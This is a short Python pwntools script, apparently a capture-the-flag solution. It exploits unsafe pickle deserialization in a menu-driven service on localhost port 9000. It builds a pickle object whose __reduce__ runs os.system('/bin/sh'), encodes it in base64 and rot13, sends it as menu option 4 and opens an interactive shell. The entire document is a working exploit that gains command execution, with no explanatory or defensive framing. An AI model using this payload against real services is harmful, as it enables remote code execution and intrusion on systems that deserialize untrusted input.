from pwn import *
import pickle
import os
import base64
import codecs

class WIN(object):
    def __reduce__(self):
        return (os.system, ('/bin/sh', ))

payload = codecs.encode(str(base64.b64encode(pickle.dumps(WIN()))),"rot-13").strip("o\'")
p = remote('127.0.0.1',9000)
p.recvuntil('4.')
p.recvline()
p.send('4\n')
p.send(payload + '\n')
p.interactive()
